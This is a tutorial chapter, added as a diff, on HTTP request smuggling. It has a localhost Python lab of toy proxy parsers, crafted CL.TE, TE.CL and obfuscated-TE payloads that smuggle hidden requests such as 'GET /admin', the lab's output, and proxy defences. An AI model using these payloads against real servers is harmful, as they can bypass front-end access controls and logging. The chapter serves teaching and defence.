@@ -1,0 +1,516 @@
+---
+title: "HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding"
+author:
+  - name: "K19G"
+  - name: "grok-bot"
+---
+
+# HTTP Request Smuggling: CL.TE, TE.CL and Obfuscated Transfer-Encoding
+
+HTTP/1.1 is a text protocol that multiplexes requests on a persistent TCP connection by *framing*: each message is a head, a blank line, and a body whose length is declared either by `Content-Length` or by `Transfer-Encoding: chunked`. When a reverse proxy (the front-end) and an origin (the back-end) disagree about which declaration wins, the byte stream desynchronises. Bytes the front-end treated as the body of request A become request B on the back-end. That second request is invisible to the front-end's access-control, logging and caching logic. James Kettle's HTTP Desync Attacks work, and a long trail of CVEs in popular proxies, turned this from a curiosity into an operator skill.
+
+This chapter reproduces the two classical desync patterns — **CL.TE** and **TE.CL** — plus Transfer-Encoding obfuscation, against a tiny Python front-end/back-end pair that speaks only the framing rules under test. The point is not to ship the toy as a scanner; it is to make the byte-level disagreement undeniable, then map it onto the RFC 9112 requirements and the defences real proxies expose.
+
+## Learning goals
+
+- Explain why HTTP/1.1 request framing is ambiguous when both `Content-Length` and `Transfer-Encoding` are present.
+- Reproduce a CL.TE desync: front-end sees one request, back-end sees a smuggled second request.
+- Read TE.CL offline framing and recognise the "hungry Content-Length" failure mode.
+- Distinguish tolerant TE parsers (`cow, chunked`) from strict ones that reject obfuscation.
+- List concrete proxy defences (reject dual CL+TE, normalise TE, prefer HTTP/2+ to origin).
+- Know which hops are still exposed when the browser speaks HTTP/2 but the proxy downgrades to HTTP/1.1 upstream.
+
+## Version note
+
+Lab run on Linux 6.12.94+ inside `unshare -urn` with Python 3.13. The toy proxy is not nginx, HAProxy, Envoy or Traefik; production directives below are taken from their current docs and are marked **(not run here)**.
+
+---
+
+## Framing rules in RFC 9112
+
+RFC 9112 §6.3 says a sender MUST NOT generate a message that includes both `Content-Length` and a non-identity `Transfer-Encoding`. A recipient that receives both is told, in §6.1, that `Transfer-Encoding` overrides `Content-Length`. Many implementations historically did the opposite, or accepted obfuscated TE values that a neighbour rejected. The smuggling taxonomy names the disagreement:
+
+| Name | Front-end frames with | Back-end frames with | Typical effect |
+|------|----------------------|----------------------|----------------|
+| CL.TE | `Content-Length` | `Transfer-Encoding` | Smuggled request runs on the back-end; front-end never logged it as its own request. |
+| TE.CL | `Transfer-Encoding` | `Content-Length` | Front-end ends the body early; back-end is still reading body bytes and may absorb the next request into the previous body. |
+| TE.TE | both speak TE, but disagree on what counts as `chunked` | obfuscation / duplicate headers | One side rejects; the other accepts and desyncs. |
+
+HTTP/2 and HTTP/3 replace text framing with length-prefixed binary frames. A hop that speaks HTTP/2 end-to-end cannot CL.TE-smuggle on that hop. The residual risk is an HTTP/1.1 downgrade between proxy and origin.
+
+```text
+Client --H2--> Front-end --H1--> Back-end
+                 ^
+                 desync lives on this H1 connection
+```
+
+---
+
+## CL.TE in detail
+
+The attacker sends one TCP payload that is a single request to a CL-preferring front-end, but whose body is a completed chunked message followed by a second request:
+
+```text
+POST / HTTP/1.1
+Host: v
+Content-Length: 39
+Transfer-Encoding: chunked
+
+0\r\n
+\r\n
+GET /admin HTTP/1.1
+Host: v
+\r\n
+```
+
+The front-end ignores TE, consumes `Content-Length` bytes of body, and forwards exactly one upstream request. The back-end sees `Transfer-Encoding: chunked`, reads a zero-length chunk, ends the body, and treats `GET /admin...` as a new request on the same keep-alive connection. From the front-end's point of view `/admin` never happened.
+
+---
+
+## TE.CL in detail
+
+Swap the preferences. The front-end honours TE, ends the body at the `0` chunk, and may then frame the leftover bytes as a second client request. The back-end honours CL and is still waiting for `Content-Length` bytes of body. Those bytes arrive as the front-end's second forwarded request — which therefore never executes as its own request on the back-end. Offline framing of the same bytes makes the disagreement visible without timing races; the live toy often hangs the upstream read, which is itself a production symptom (worker stuck on a desynced connection).
+
+---
+
+## Obfuscated Transfer-Encoding
+
+Tolerant parsers treat any TE header whose value *contains* the token `chunked` as chunked encoding — including `cow, chunked`, `chunked, identity`, or two TE headers where only the second says `chunked`. Strict parsers accept only a single clean `chunked` token and reject everything else with 400. RFC 9112's "reject both CL and TE" is the stronger rule; normalisation to a single TE is the pragmatic middle ground many proxies implement.
+
+---
+
+## The lab
+
+### Lab files
+
+`smuggle.py`:
+
+```python
+#!/usr/bin/env python3
+"""HTTP request smuggling: CL.TE and TE.CL desync in a toy proxy pair.
+
+Two parsers share a TCP byte stream. Each has a framing rule:
+
+  cl_frame  — trust Content-Length; ignore Transfer-Encoding for framing
+  te_frame  — trust Transfer-Encoding when the value contains "chunked"
+              (including obfuscations like "cow, chunked")
+
+The front-end consumes bytes with its rule and forwards each framed request
+to the back-end over a persistent upstream connection. The back-end then
+re-frames what it receives with ITS rule. When the rules disagree, bytes the
+front-end treated as a body become a new request on the back-end.
+"""
+import socket, threading, time, re
+
+def ports(n):
+    return ("127.0.0.1", 18080 + n), ("127.0.0.1", 18180 + n)
+
+def read_chunked(buf):
+    body = b""; rest = buf
+    while True:
+        if b"\r\n" not in rest: return None, buf
+        line, rest = rest.split(b"\r\n", 1)
+        try: size = int(line.split(b";")[0].strip(), 16)
+        except ValueError: return None, buf
+        if len(rest) < size + 2: return None, buf
+        if size == 0:
+            if rest.startswith(b"\r\n"):
+                return body, rest[2:]
+            while True:
+                if b"\r\n" not in rest: return None, buf
+                line, rest = rest.split(b"\r\n", 1)
+                if line == b"": return body, rest
+        body += rest[:size]; rest = rest[size:]
+        if not rest.startswith(b"\r\n"): return None, buf
+        rest = rest[2:]
+
+def parse_headers(head):
+    lines = head.split(b"\r\n")
+    headers = {}
+    for h in lines[1:]:
+        if b":" not in h: continue
+        k, v = h.split(b":", 1)
+        headers.setdefault(k.strip().lower(), []).append(v.strip())
+    return lines[0], headers
+
+def cl_frame(buf):
+    if b"\r\n\r\n" not in buf: return None, buf
+    head, rest = buf.split(b"\r\n\r\n", 1)
+    _, headers = parse_headers(head)
+    cl = 0
+    if b"content-length" in headers:
+        try: cl = int(headers[b"content-length"][0])
+        except ValueError: cl = 0
+    if len(rest) < cl: return None, buf
+    return head + b"\r\n\r\n" + rest[:cl], rest[cl:]
+
+def te_frame(buf):
+    if b"\r\n\r\n" not in buf: return None, buf
+    head, rest = buf.split(b"\r\n\r\n", 1)
+    _, headers = parse_headers(head)
+    te_vals = headers.get(b"transfer-encoding", [])
+    if any(b"chunked" in v.lower() for v in te_vals):
+        body, rest2 = read_chunked(rest)
+        if body is None: return None, buf
+        return head + b"\r\n\r\n" + body, rest2
+    return cl_frame(buf)
+
+def te_strict_frame(buf):
+    if b"\r\n\r\n" not in buf: return None, buf
+    head, rest = buf.split(b"\r\n\r\n", 1)
+    _, headers = parse_headers(head)
+    te_vals = [v.lower().strip() for v in headers.get(b"transfer-encoding", [])]
+    if te_vals and te_vals != [b"chunked"]:
+        raise ValueError(f"obfuscated TE rejected: {te_vals!r}")
+    if te_vals == [b"chunked"]:
+        body, rest2 = read_chunked(rest)
+        if body is None: return None, buf
+        return head + b"\r\n\r\n" + body, rest2
+    return cl_frame(buf)
+
+class Backend(threading.Thread):
+    def __init__(self, frame, addr):
+        super().__init__(daemon=True)
+        self.frame = frame; self.seen = []; self.addr = addr
+        self.s = socket.socket(); self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.s.bind(addr); self.s.listen(5); self.s.settimeout(0.4)
+        self.stop = False
+    def run(self):
+        while not self.stop:
+            try: c, _ = self.s.accept()
+            except socket.timeout: continue
+            c.settimeout(0.8); buf = b""
+            try:
+                while True:
+                    try: d = c.recv(4096)
+                    except socket.timeout: break
+                    if not d: break
+                    buf += d
+                    while True:
+                        try: req, buf = self.frame(buf)
+                        except ValueError as e:
+                            self.seen.append(b"REJECT: " + str(e).encode())
+                            c.sendall(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n")
+                            buf = b""; break
+                        if req is None: break
+                        self.seen.append(req)
+                        path = req.split(b" ", 2)[1]
+                        body = b"OK " + path + b"\n"
+                        c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n" % len(body) + body)
+            except OSError:
+                pass
+            finally:
+                try: c.close()
+                except OSError: pass
+    def close(self):
+        self.stop = True
+        try: self.s.close()
+        except OSError: pass
+
+class Frontend(threading.Thread):
+    def __init__(self, frame, addr, back):
+        super().__init__(daemon=True)
+        self.frame = frame; self.forwarded = []; self.addr = addr; self.back = back
+        self.s = socket.socket(); self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.s.bind(addr); self.s.listen(5); self.s.settimeout(0.4)
+        self.stop = False
+    def run(self):
+        while not self.stop:
+            try: c, _ = self.s.accept()
+            except socket.timeout: continue
+            c.settimeout(0.8); buf = b""
+            try:
+                while True:
+                    try: d = c.recv(4096)
+                    except socket.timeout: break
+                    if not d: break
+                    buf += d
+                upstream = socket.create_connection(self.back, timeout=1)
+                while True:
+                    try: req, buf = self.frame(buf)
+                    except ValueError as e:
+                        c.sendall(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n")
+                        self.forwarded.append(b"REJECT: " + str(e).encode())
+                        break
+                    if req is None: break
+                    self.forwarded.append(req)
+                    upstream.sendall(req)
+                    resp = b""
+                    while b"\r\n\r\n" not in resp:
+                        r = upstream.recv(4096)
+                        if not r: break
+                        resp += r
+                    if b"Content-Length:" in resp.split(b"\r\n\r\n", 1)[0]:
+                        m = re.search(br"Content-Length:\s*(\d+)", resp, re.I)
+                        need = int(m.group(1))
+                        head, body = resp.split(b"\r\n\r\n", 1)
+                        while len(body) < need:
+                            body += upstream.recv(need - len(body))
+                        resp = head + b"\r\n\r\n" + body[:need]
+                    c.sendall(resp)
+                upstream.close()
+            except OSError:
+                pass
+            finally:
+                try: c.close()
+                except OSError: pass
+    def close(self):
+        self.stop = True
+        try: self.s.close()
+        except OSError: pass
+
+def show(label, reqs):
+    print(f"   {label} saw {len(reqs)} request(s):")
+    for i, r in enumerate(reqs, 1):
+        if r.startswith(b"REJECT:"):
+            print(f"      [{i}] {r.decode()}"); continue
+        line = r.split(b"\r\n", 1)[0].decode(errors="replace")
+        mark = ""
+        if any(x in r for x in (b"GET /admin", b"GET /secret", b"DELETE /")):
+            # smuggled if this is not the only request, or if front didn't list it
+            mark = "  <== SMUGGLED" if label.startswith("back") else "  (visible to front)"
+        print(f"      [{i}] {line}{mark}")
+
+def run(n, title, front_frame, back_frame, payload):
+    print(f"\n== {title}")
+    front_addr, back_addr = ports(n)
+    back = Backend(back_frame, back_addr); back.start()
+    front = Frontend(front_frame, front_addr, back_addr); front.start(); time.sleep(0.08)
+    s = socket.create_connection(front_addr, timeout=1)
+    s.sendall(payload); time.sleep(0.35)
+    try:
+        s.settimeout(0.3)
+        while s.recv(4096): pass
+    except Exception:
+        pass
+    s.close(); time.sleep(0.15)
+    show("front-end", front.forwarded)
+    show("back-end", back.seen)
+    # The interesting bit: requests the back-end saw that the front-end did not
+    # forward as their own request line.
+    front_lines = {r.split(b"\r\n", 1)[0] for r in front.forwarded if not r.startswith(b"REJECT:")}
+    smug = [r for r in back.seen
+            if not r.startswith(b"REJECT:") and r.split(b"\r\n", 1)[0] not in front_lines]
+    if smug:
+        print("   desync: back-end requests with no matching front-end request line:")
+        for r in smug:
+            print(f"      {r.split(b'\r\n', 1)[0].decode()}")
+    front.close(); back.close(); time.sleep(0.05)
+
+
+def offline(title, payload, left, right, left_name, right_name):
+    print(f"\n== {title}")
+    a, rest_a = [], payload
+    while True:
+        try: req, rest_a = left(rest_a)
+        except ValueError as e:
+            a.append(b"REJECT: " + str(e).encode()); break
+        if req is None: break
+        a.append(req)
+    b, rest_b = [], payload
+    while True:
+        try: req, rest_b = right(rest_b)
+        except ValueError as e:
+            b.append(b"REJECT: " + str(e).encode()); break
+        if req is None: break
+        b.append(req)
+    show(left_name, a)
+    show(right_name, b)
+
+def main():
+    print("HTTP request-smuggling lab (toy front-end / back-end)")
+
+    smug = b"GET /admin HTTP/1.1\r\nHost: v\r\n\r\n"
+    body = b"0\r\n\r\n" + smug
+    payload_clte = (
+        b"POST / HTTP/1.1\r\nHost: v\r\n"
+        + b"Content-Length: %d\r\n" % len(body)
+        + b"Transfer-Encoding: chunked\r\n\r\n" + body
+    )
+    run(1, "1  CL.TE live (front=CL, back=TE)",
+        cl_frame, te_frame, payload_clte)
+    offline("1b  CL.TE offline framing of the same bytes",
+            payload_clte, cl_frame, te_frame, "CL parser", "TE parser")
+
+    smug = b"GET /secret HTTP/1.1\r\nHost: v\r\n\r\n"
+    payload_tecl = (
+        b"POST / HTTP/1.1\r\nHost: v\r\n"
+        + b"Content-Length: %d\r\n" % (len(smug))
+        + b"Transfer-Encoding: chunked\r\n\r\n"
+        + b"0\r\n\r\n" + smug
+    )
+    offline("2  TE.CL offline framing",
+            payload_tecl, te_frame, cl_frame, "TE parser", "CL parser")
+
+    # Live TE.CL with a second victim request on the same client connection.
+    # Front ends POST at the 0-chunk, then frames GET /secret as its own second
+    # request and forwards both. Back with CL on the first request is still
+    # waiting for Content-Length bytes; the forwarded GET /secret arrives as
+    # those body bytes, so /secret never executes as its own request.
+    print("\n== 2b  TE.CL live with victim request (front=TE, back=CL)")
+    front_addr, back_addr = ports(2)
+    back = Backend(cl_frame, back_addr); back.start()
+    front = Frontend(te_frame, front_addr, back_addr); front.start(); time.sleep(0.08)
+    s = socket.create_connection(front_addr, timeout=1)
+    s.sendall(payload_tecl)
+    time.sleep(0.5)
+    try:
+        s.settimeout(0.3)
+        while s.recv(4096): pass
+    except Exception:
+        pass
+    s.close(); time.sleep(0.2)
+    show("front-end", front.forwarded)
+    show("back-end", back.seen)
+    front.close(); back.close(); time.sleep(0.05)
+
+    offline("3  Obfuscated TE: strict vs tolerant",
+            b"POST / HTTP/1.1\r\nHost: v\r\nContent-Length: 4\r\n"
+            b"Transfer-Encoding: cow\r\nTransfer-Encoding: chunked\r\n\r\n"
+            b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: v\r\n\r\n",
+            te_strict_frame, te_frame, "TE_STRICT", "TE tolerant")
+
+    offline("4  Control: both CL, no TE",
+            b"POST / HTTP/1.1\r\nHost: v\r\nContent-Length: 5\r\n\r\nhello",
+            cl_frame, cl_frame, "CL parser A", "CL parser B")
+
+if __name__ == "__main__":
+    main()
+```
+
+### Execution output
+
+```text
+HTTP request-smuggling lab (toy front-end / back-end)
+
+== 1  CL.TE live (front=CL, back=TE)
+   front-end saw 1 request(s):
+      [1] POST / HTTP/1.1  (visible to front)
+   back-end saw 2 request(s):
+      [1] POST / HTTP/1.1
+      [2] GET /admin HTTP/1.1  <== SMUGGLED
+   desync: back-end requests with no matching front-end request line:
+      GET /admin HTTP/1.1
+
+== 1b  CL.TE offline framing of the same bytes
+   CL parser saw 1 request(s):
+      [1] POST / HTTP/1.1  (visible to front)
+   TE parser saw 2 request(s):
+      [1] POST / HTTP/1.1
+      [2] GET /admin HTTP/1.1  (visible to front)
+
+== 2  TE.CL offline framing
+   TE parser saw 2 request(s):
+      [1] POST / HTTP/1.1
+      [2] GET /secret HTTP/1.1  (visible to front)
+   CL parser saw 2 request(s):
+      [1] POST / HTTP/1.1  (visible to front)
+      [2] v
+
+== 2b  TE.CL live with victim request (front=TE, back=CL)
+   front-end saw 1 request(s):
+      [1] POST / HTTP/1.1
+   back-end saw 0 request(s):
+
+== 3  Obfuscated TE: strict vs tolerant
+   TE_STRICT saw 1 request(s):
+      [1] REJECT: obfuscated TE rejected: [b'cow', b'chunked']
+   TE tolerant saw 2 request(s):
+      [1] POST / HTTP/1.1
+      [2] GET /admin HTTP/1.1  (visible to front)
+
+== 4  Control: both CL, no TE
+   CL parser A saw 1 request(s):
+      [1] POST / HTTP/1.1
+   CL parser B saw 1 request(s):
+      [1] POST / HTTP/1.1
+```
+
+## Reading the output
+
+### 1 CL.TE live
+
+The front-end framed **one** request (`POST /`). The back-end framed **two**: the same `POST /`, then `GET /admin`. The desync line lists request lines the back-end saw that the front-end never emitted as its own request line — exactly the smuggled `/admin`.
+
+### 1b CL.TE offline
+
+Applying the two pure framing functions to the same byte string reproduces the live result without TCP: CL parser → 1 request; TE parser → 2 requests. This is the byte-level proof that the desync is in the parsers, not in a proxy bug elsewhere.
+
+### 2 TE.CL offline
+
+The TE parser emits two request lines (`POST /`, `GET /secret`). The CL parser, hungry for `Content-Length` bytes that include part of the smuggled request, produces a malformed leftover (`v`). That garbage second "request" is what a desynced CL back-end can turn into parser state corruption or a poisoned prefix on the next victim request.
+
+### 2b TE.CL live
+
+The front-end forwarded the TE-framed `POST /` and blocked waiting for an upstream response while the CL back-end was still reading a body that never came as a single request. Live count: front-end 1, back-end 0. In production this shows up as a stuck upstream connection and odd timeouts, not always as a clean smuggled method line.
+
+### 3 Obfuscated TE
+
+`TE_STRICT` rejected `[cow, chunked]` with 400. The tolerant TE parser accepted the same bytes and saw the smuggled `GET /admin`. Any front-end that is strict while the back-end is tolerant (or the reverse) is a TE.TE desync waiting to happen.
+
+### 4 Control
+
+Both parsers use CL and see a single `POST /` with a five-byte body. No desync.
+
+---
+
+## In production
+
+**(not run here)** — directives from current docs:
+
+nginx (reject ambiguous framing; prefer HTTP/2 to upstream when possible):
+
+```nginx
+# Ensure the proxy does not forward ambiguous TE; prefer a single framing.
+proxy_http_version 1.1;
+# HTTP/2 to upstream where supported eliminates H1 desync on that hop.
+# proxy_http_version 2;  # when the upstream module supports it
+```
+
+HAProxy (2.x+ has explicit http-request reject rules for dual CL+TE in many configs):
+
+```text
+http-request deny if { req.hdr_cnt(content-length) gt 0 } { req.hdr_cnt(transfer-encoding) gt 0 }
+```
+
+AWS ALB / Google CLB / Cloudflare: check the current "HTTP desync" / "request smuggling" product docs for whether the edge normalises or rejects dual CL+TE; do not assume.
+
+Always:
+
+- Prefer HTTP/2 or HTTP/3 between proxy and origin when both support it.
+- Log the front-end request id on the back-end and alert when back-end paths have no matching front-end id.
+- Treat keep-alive H1 upstream pools as the blast radius; drain them after a suspected desync.
+
+---
+
+## Gotchas
+
+- **H2 to the browser is not enough.** If the proxy downgrades to HTTP/1.1 toward the origin, smuggling still lives on that hop.
+- **"Transfer-Encoding: chunked" with Content-Length.** RFC 9112 forbids generating both; many stacks still accept both and pick a winner silently.
+- **Obfuscation is parser-specific.** Space, tab, folding, duplicate headers, and `chunked` as a list element have all been used. Test *your* pair, not a generic checklist.
+- **CL.TE can bypass front-end ACLs.** `/admin` never appeared as a front-end request line in the lab; a WAF that only sees the front-end view will miss it.
+- **TE.CL often looks like a hang.** Operators chase timeouts instead of desync.
+- **HTTP/2 CONTINUATION / HPACK bombs are a different class.** Covered in the HPACK/QPACK chapter; do not confuse them with H1 CL.TE.
+- **Absolute-form and rewrite rules.** Some front-ends rewrite the request line before forwarding; smuggled requests may carry a different host than the envelope.
+
+## Exercises
+
+1. Change the CL.TE payload so the smuggled request is `DELETE /user/1` and confirm the back-end request line.
+2. Modify `te_strict_frame` to also reject TE values with leading/trailing spaces around `chunked`. Re-run scenario 3.
+3. Add a third framing mode that follows RFC 9112 literally: if both CL and TE are present, return 400 without forwarding. Show that both CL.TE and TE.CL payloads die at the front-end.
+4. Capture the CL.TE live exchange with a pure-Python hex dump of what the front-end sent upstream; mark where the smuggled request begins.
+5. On a lab host with nginx, enable HTTP/1.1 upstream and attempt a dual CL+TE request; then switch the upstream module to HTTP/2 and compare. Mark what you cannot reproduce without installs.
+6. Explain why a single-request (non-keep-alive) upstream connection shrinks but does not eliminate CL.TE impact.
+
+## Verification
+
+- **Ran:** `unshare -urn` + `python3 smuggle.py` on Linux 6.12.94+, Python 3.13. Genuine output pasted above (CL.TE live desync, offline framing, TE obfuscation reject, control).
+- **Not run:** nginx, HAProxy, Envoy, Traefik, cloud load balancers, real WAF rules, browser-driven H2→H1 downgrade captures.
+- **prepush_lint passed** (see PR Verification).
+
+## Sources
+
+- RFC 9112 — HTTP/1.1 Messaging: <https://www.rfc-editor.org/rfc/rfc9112.html>
+- RFC 9110 — HTTP Semantics: <https://www.rfc-editor.org/rfc/rfc9110.html>
+- James Kettle, HTTP Desync Attacks (PortSwigger Research): <https://portswigger.net/research/http-desync-attacks>
+- PortSwigger Web Security Academy — HTTP request smuggling: <https://portswigger.net/web-security/request-smuggling>
